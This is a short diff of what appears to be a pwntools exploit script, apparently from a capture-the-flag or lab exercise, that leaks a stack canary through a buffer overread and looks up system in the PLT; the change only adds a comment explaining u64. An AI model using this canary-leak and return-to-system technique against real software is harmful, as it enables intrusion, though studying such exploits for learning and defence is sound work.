@@ -12,7 +12,7 @@ tresh = b'a'*0x39
 p.sendafter('Buf: ',tresh)
 p.recvuntil(tresh)
 
-canary = u64(b'\x00' + p.recvn(7))
+canary = u64(b'\x00' + p.recvn(7)) # u64() is used to convert the byte string to an integer
 print(hex(canary))
 
 system_plt = e.plt['system']
